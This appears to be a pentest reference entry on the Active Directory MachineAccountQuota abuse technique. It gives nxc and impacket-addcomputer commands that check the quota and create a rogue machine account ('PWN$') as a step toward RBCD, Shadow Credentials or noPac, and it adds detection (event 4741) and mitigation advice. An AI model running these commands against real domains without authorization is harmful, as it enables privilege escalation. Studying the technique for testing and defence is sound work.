---
id: machineaccountquota
type: technique
label: "MachineAccountQuota abuse"
phase: "privesc"
tools: ["powermad", "impacket"]
cve: null
detect: "Unusual volume of computer-object creation from one user."
mitre: "T1136.002"
tag: null
---


# MachineAccountQuota abuse

### Affected object / attribute
**`ms-DS-MachineAccountQuota`** on the domain object (default **10**).

### Concept (deep)
Any authenticated user can create machine accounts — the prerequisite for **RBCD**, **Shadow Credentials**, **noPac**.

### Commands
```bash
# ── Check MAQ ────────────────────────────────────────────────────────
nxc ldap 10.10.10.5 -u lowpriv -p 'Password123!' -M maq

# ── Create a machine account ─────────────────────────────────────────
impacket-addcomputer -computer-name 'PWN$' -computer-pass 'Pwn123!' \
  -dc-ip 10.10.10.5 corp.local/lowpriv:'Password123!'
```

### Detection and defensive measures
**4741** machine account creation by non-machine principals; set MAQ to **0** and delegate creation to a tier-0 group.

---
